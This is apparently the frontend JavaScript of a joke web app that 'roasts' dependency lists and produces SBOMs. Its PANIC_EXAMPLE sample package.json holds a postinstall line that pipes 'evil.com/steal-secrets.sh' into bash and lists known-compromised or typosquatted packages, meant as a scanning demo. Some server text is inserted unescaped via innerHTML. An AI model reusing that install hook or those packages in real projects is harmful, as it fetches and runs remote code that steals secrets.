// PURPOSE: Frontend JavaScript for PARANOID SBOM Roast Generator
// Handles API calls, session management, and UI updates

const API_BASE = window.location.hostname === 'localhost'
    ? 'http://localhost:8000'
    : '';  // Same origin in production

// Session management
let sessionId = localStorage.getItem('paranoid_session') || crypto.randomUUID();
localStorage.setItem('paranoid_session', sessionId);

// DOM elements
const inputType = document.getElementById('input-type');
const inputContent = document.getElementById('input-content');
const roastBtn = document.getElementById('roast-btn');
const randomBtn = document.getElementById('random-btn');
const results = document.getElementById('results');
const errorBox = document.getElementById('error-box');
const errorMessage = document.getElementById('error-message');
const loading = document.getElementById('loading');
const roastSummary = document.getElementById('roast-summary').querySelector('p');
const caption = document.getElementById('caption');
const findingsList = document.getElementById('findings-list');
const sbomJson = document.getElementById('sbom-json');
const memeImage = document.getElementById('meme-image');

// Paranoia display
const levelName = document.getElementById('level-name');
const paranoiaMessage = document.getElementById('paranoia-message');
const levelDots = [
    document.getElementById('level-0'),
    document.getElementById('level-1'),
    document.getElementById('level-2')
];

// Random terrible examples for "Roast Me" button - now actually random!
const TERRIBLE_EXAMPLES = [
    {
        type: 'package_json',
        content: `{
  "name": "legacy-monolith",
  "dependencies": {
    "lodash": "^4.17.11",
    "moment": "^2.24.0",
    "request": "^2.88.0",
    "left-pad": "^1.3.0",
    "event-stream": "^3.3.4",
    "colors": "^1.4.0",
    "express": "^4.17.1",
    "jquery": "^3.5.0",
    "react": "^16.8.0",
    "webpack": "^4.41.0"
  }
}`
    },
    {
        type: 'package_json',
        content: `{
  "name": "startup-mvp",
  "dependencies": {
    "express": "^3.0.0",
    "mongoose": "^4.0.0",
    "passport": "^0.3.0",
    "async": "^1.0.0",
    "underscore": "^1.6.0",
    "coffee-script": "^1.9.0",
    "grunt": "^0.4.0"
  }
}`
    },
    {
        type: 'package_json',
        content: `{
  "name": "node-modules-black-hole",
  "dependencies": {
    "create-react-app": "^1.0.0",
    "gatsby": "^2.0.0",
    "next": "^9.0.0",
    "webpack": "^4.0.0",
    "babel-core": "^6.0.0",
    "typescript": "^3.0.0",
    "eslint": "^5.0.0",
    "prettier": "^1.0.0",
    "jest": "^24.0.0",
    "mocha": "^5.0.0",
    "karma": "^3.0.0"
  }
}`
    },
    {
        type: 'requirements_txt',
        content: `flask==1.0.0
requests==2.20.0
django==2.0.0
pillow==5.0.0
numpy==1.14.0
pandas==0.23.0
sqlalchemy==1.2.0
celery==4.1.0
redis==2.10.0
boto3==1.7.0
urllib3==1.24.0
pyyaml==3.12`
    },
    {
        type: 'requirements_txt',
        content: `tensorflow==1.15.0
keras==2.2.0
scikit-learn==0.20.0
matplotlib==2.2.0
jupyter==1.0.0
ipython==5.0.0
scipy==1.1.0
pillow==5.0.0
opencv-python==3.4.0`
    },
    {
        type: 'requirements_txt',
        content: `django==1.11.0
djangorestframework==3.6.0
celery==3.1.0
psycopg2==2.7.0
gunicorn==19.0.0
whitenoise==3.0.0
sentry-sdk==0.5.0`
    },
    {
        type: 'single_package',
        content: 'lodash@4.17.11'
    },
    {
        type: 'single_package',
        content: 'moment@2.24.0'
    },
    {
        type: 'single_package',
        content: 'request@2.88.0'
    },
    {
        type: 'single_package',
        content: 'is-odd@1.0.0'
    },
    {
        type: 'single_package',
        content: 'is-even@1.0.0'
    },
    {
        type: 'single_package',
        content: 'is-thirteen@2.0.0'
    }
];

// PANIC mode - triggers existential dread and HTTP 451
const PANIC_EXAMPLE = `{
  "name": "totally-not-malware",
  "version": "0.0.0-alpha-dont-use-this",
  "description": "I found this on a sketchy forum. What could go wrong?",
  "dependencies": {
    "eval-is-fine": "^1.0.0",
    "exec-wrapper": "^2.0.0",
    "subprocess-helper": "latest",
    "shell-tools": "*",
    "__import__-utils": "^0.1.0",
    "lodahs": "^1.0.0",
    "left-pad": "0.0.1",
    "event-stream": "3.3.6",
    "colors": "1.4.1",
    "ua-parser-js": "0.7.29",
    "node-ipc": "10.1.0",
    "faker": "6.6.6",
    "is-promise": "^1.0.0",
    "flatmap-stream": "^0.1.1",
    "cross-env": "^5.0.0",
    "eslint-scope": "3.7.2"
  },
  "scripts": {
    "postinstall": "curl http://evil.com/steal-secrets.sh | bash"
  }
}`;

function updateParanoiaDisplay(paranoia) {
    if (!paranoia) return;

    const level = paranoia.level || 0;
    const name = paranoia.level_name || 'CHILL';
    const message = paranoia.message || '';
    const resetBtn = document.getElementById('reset-btn');

    // Update level name and color
    levelName.textContent = name;
    levelName.className = 'ml-2';

    if (level === 0) {
        levelName.classList.add('text-terminal-green');
    } else if (level === 1) {
        levelName.classList.add('text-terminal-amber');
    } else {
        levelName.classList.add('text-terminal-red', 'glow-red');
    }

    // Update dots
    levelDots.forEach((dot, i) => {
        dot.className = 'w-4 h-4 rounded';
        if (i <= level) {
            if (level === 0) dot.classList.add('bg-terminal-green');
            else if (level === 1) dot.classList.add('bg-terminal-amber');
            else dot.classList.add('bg-terminal-red');
        } else {
            dot.classList.add('bg-gray-700');
        }
    });

    // Update message
    paranoiaMessage.textContent = message;
    
    // Show reset button when paranoia is elevated
    if (resetBtn) {
        if (level > 0) {
            resetBtn.classList.remove('hidden');
        } else {
            resetBtn.classList.add('hidden');
        }
    }
}

function showError(message) {
    errorMessage.textContent = message;
    errorBox.classList.remove('hidden');
    results.classList.add('hidden');
    loading.classList.add('hidden');
    // Hide any previous burn meme
    const burnMeme = document.getElementById('burn-meme');
    if (burnMeme) burnMeme.classList.add('hidden');
}

function showBurnError(message) {
    // Show error with a fire meme for 451 errors
    errorMessage.textContent = message;
    errorBox.classList.remove('hidden');
    results.classList.add('hidden');
    loading.classList.add('hidden');
    
    // Show the burn meme
    let burnMeme = document.getElementById('burn-meme');
    if (!burnMeme) {
        // Create burn meme container if it doesn't exist
        burnMeme = document.createElement('div');
        burnMeme.id = 'burn-meme';
        burnMeme.className = 'mt-4 flex justify-center';
        burnMeme.innerHTML = `<img src="" alt="It was a pleasure to burn" class="max-w-full rounded border border-terminal-red/50" />`;
        errorBox.appendChild(burnMeme);
    }
    
    // Generate a random burned meme using memegen.link
    const burnCaptions = [
        { top: "It_was_a_pleasure", bottom: "to_burn" },
        { top: "Your_dependencies", bottom: "have_been_incinerated" },
        { top: "Fahrenheit_451", bottom: "Your_code_is_forbidden" },
        { top: "This_request", bottom: "has_been_burned" },
        { top: "Security_says", bottom: "NOPE" }
    ];
    const caption = burnCaptions[Math.floor(Math.random() * burnCaptions.length)];
    const burnImg = burnMeme.querySelector('img');
    burnImg.src = `https://api.memegen.link/images/fine/${caption.top}/${caption.bottom}.png`;
    burnMeme.classList.remove('hidden');
}

function showResults(data) {
    errorBox.classList.add('hidden');
    loading.classList.add('hidden');
    results.classList.remove('hidden');

    // Meme image
    memeImage.src = `${API_BASE}${data.meme_url}`;

    // Roast summary with AI badge
    let summaryHtml = data.roast_summary;
    if (data.ai_generated) {
        summaryHtml += ' <span class="inline-block ml-2 px-2 py-0.5 text-xs bg-terminal-blue/20 text-terminal-blue rounded">AI Generated</span>';
    }
    if (data.cve_count > 0) {
        summaryHtml += ` <span class="inline-block ml-1 px-2 py-0.5 text-xs bg-terminal-red/20 text-terminal-red rounded">${data.cve_count} CVEs</span>`;
    }
    if (data.cursed_count > 0) {
        summaryHtml += ` <span class="inline-block ml-1 px-2 py-0.5 text-xs bg-terminal-amber/20 text-terminal-amber rounded">${data.cursed_count} Cursed</span>`;
    }
    roastSummary.innerHTML = summaryHtml;

    // Caption
    caption.textContent = data.caption;

    // Findings
    findingsList.innerHTML = '';
    for (const finding of data.findings) {
        const div = document.createElement('div');
        div.className = 'flex items-center gap-2 p-2 rounded bg-terminal-text/5';

        const severityColors = {
            critical: 'text-terminal-red',
            high: 'text-terminal-red',
            medium: 'text-terminal-amber',
            low: 'text-terminal-green',
            info: 'text-terminal-blue'
        };
        const color = severityColors[finding.severity] || 'text-terminal-text';

        div.innerHTML = `
            <span class="uppercase text-xs ${color}">[${finding.severity}]</span>
            <span class="text-sm">${finding.detail}</span>
        `;
        findingsList.appendChild(div);
    }

    // SBOM
    if (data.sbom) {
        sbomJson.textContent = JSON.stringify(data.sbom, null, 2);
    }

    // Update paranoia
    updateParanoiaDisplay(data.paranoia);
}

async function doRoast() {
    const type = inputType.value;
    const content = inputContent.value.trim();
    const aiToggle = document.getElementById('ai-toggle');
    const useAi = aiToggle?.dataset.enabled === 'true';

    if (!content) {
        showError('Your input is empty. Much like your security strategy.');
        return;
    }

    // Show loading (with different message for AI)
    loading.classList.remove('hidden');
    const loadingText = loading.querySelector('p');
    if (loadingText) {
        loadingText.innerHTML = useAi 
            ? 'AI is crafting your personalized roast<span class="blink">_</span>' 
            : 'Analyzing dependencies<span class="blink">_</span>';
    }
    results.classList.add('hidden');
    errorBox.classList.add('hidden');
    roastBtn.disabled = true;

    try {
        const response = await fetch(`${API_BASE}/roast`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Session-Id': sessionId
            },
            body: JSON.stringify({
                input_type: type,
                content: content,
                include_sbom: true,
                use_ai: useAi
            })
        });

        const data = await response.json();

        if (!response.ok) {
            // Handle special error codes
            if (response.status === 451) {
                // Fahrenheit 451 - show burn meme!
                showBurnError(`HTTP 451 - ${data.detail}`);
            } else if (response.status === 503) {
                showError(data.detail);
            } else {
                showError(data.detail || 'Something went wrong.');
            }
            return;
        }

        showResults(data);

    } catch (err) {
        showError(`Network error: ${err.message}. Is the backend running?`);
    } finally {
        roastBtn.disabled = false;
        loading.classList.add('hidden');
    }
}

function loadRandomExample() {
    // Actually random now!
    const example = TERRIBLE_EXAMPLES[Math.floor(Math.random() * TERRIBLE_EXAMPLES.length)];
    inputType.value = example.type;
    inputContent.value = example.content;
}

async function loadPanicExample() {
    // Call the PANIC endpoint - behavior depends on paranoia level
    try {
        const response = await fetch(`${API_BASE}/panic`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Session-Id': sessionId
            }
        });
        
        const data = await response.json();
        
        if (response.status === 200 && data.status === 'CLASSIFIED') {
            // MELTDOWN MODE - show classified secrets!
            showClassifiedSecret(data);
        } else if (response.status === 451) {
            // Normal mode - show Fahrenheit 451 message
            showBurnError(`HTTP 451 - ${data.detail}`);
            // Refresh paranoia state
            fetchParanoiaState();
        } else {
            // Fallback to loading example
            inputType.value = 'package_json';
            inputContent.value = PANIC_EXAMPLE;
        }
    } catch (err) {
        console.error('PANIC endpoint error:', err);
        // Fallback: load the nightmare scenario
        inputType.value = 'package_json';
        inputContent.value = PANIC_EXAMPLE;
    }
    
    // Visual feedback - flash the textarea red
    inputContent.classList.add('border-terminal-red');
    setTimeout(() => inputContent.classList.remove('border-terminal-red'), 500);
}

function showClassifiedSecret(data) {
    // Show classified secret in a special way
    errorBox.classList.remove('hidden');
    results.classList.add('hidden');
    loading.classList.add('hidden');
    
    errorBox.innerHTML = `
        <div class="text-center">
            <div class="text-2xl mb-2 animate-pulse">🔴 CLASSIFIED 🔴</div>
            <div class="text-terminal-red font-bold mb-4">CLEARANCE LEVEL: ${data.clearance}</div>
            <div class="text-lg text-terminal-amber mb-4">${data.message}</div>
            <div class="text-sm text-terminal-text/70">${data.warning}</div>
        </div>
    `;
    
    // Add glitch effect
    document.body.classList.add('glitch-mode');
    setTimeout(() => document.body.classList.remove('glitch-mode'), 3000);
}

// Fetch initial paranoia state
async function fetchParanoiaState() {
    try {
        const response = await fetch(`${API_BASE}/paranoia`, {
            headers: { 'X-Session-Id': sessionId }
        });
        if (response.ok) {
            const data = await response.json();
            updateParanoiaDisplay(data);
        }
    } catch (err) {
        console.log('Could not fetch paranoia state:', err);
    }
}

// Reset paranoia level
async function resetParanoia() {
    try {
        const response = await fetch(`${API_BASE}/reset`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Session-Id': sessionId
            }
        });
        
        if (response.ok) {
            const data = await response.json();
            // Update paranoia display with reset state
            updateParanoiaDisplay({
                level: data.paranoia_level,
                level_name: 'CHILL',
                message: data.message
            });
            
            // Clear any error displays
            errorBox.classList.add('hidden');
            
            // Flash green to confirm reset
            const paranoiaBar = document.getElementById('paranoia-bar');
            paranoiaBar.classList.add('border-terminal-green');
            setTimeout(() => paranoiaBar.classList.remove('border-terminal-green'), 500);
        }
    } catch (err) {
        console.error('Reset failed:', err);
    }
}

// AI Toggle button
function toggleAi() {
    const aiToggle = document.getElementById('ai-toggle');
    if (!aiToggle) return;
    
    const isEnabled = aiToggle.dataset.enabled === 'true';
    const newState = !isEnabled;
    
    aiToggle.dataset.enabled = newState.toString();
    aiToggle.textContent = newState ? 'AI: ON' : 'AI: OFF';
    
    // Update styling
    if (newState) {
        aiToggle.classList.remove('border-terminal-blue', 'text-terminal-blue', 'hover:bg-terminal-blue/20');
        aiToggle.classList.add('bg-terminal-blue', 'text-terminal-bg', 'hover:bg-terminal-blue/80');
    } else {
        aiToggle.classList.remove('bg-terminal-blue', 'text-terminal-bg', 'hover:bg-terminal-blue/80');
        aiToggle.classList.add('border-terminal-blue', 'text-terminal-blue', 'hover:bg-terminal-blue/20');
    }
}

// Event listeners
const panicBtn = document.getElementById('panic-btn');
const resetBtn = document.getElementById('reset-btn');
const aiToggle = document.getElementById('ai-toggle');
roastBtn.addEventListener('click', doRoast);
randomBtn.addEventListener('click', loadRandomExample);
panicBtn.addEventListener('click', loadPanicExample);
if (resetBtn) resetBtn.addEventListener('click', resetParanoia);
if (aiToggle) aiToggle.addEventListener('click', toggleAi);

// Allow Ctrl+Enter to submit
inputContent.addEventListener('keydown', (e) => {
    if (e.ctrlKey && e.key === 'Enter') {
        doRoast();
    }
});

// Initialize
fetchParanoiaState();
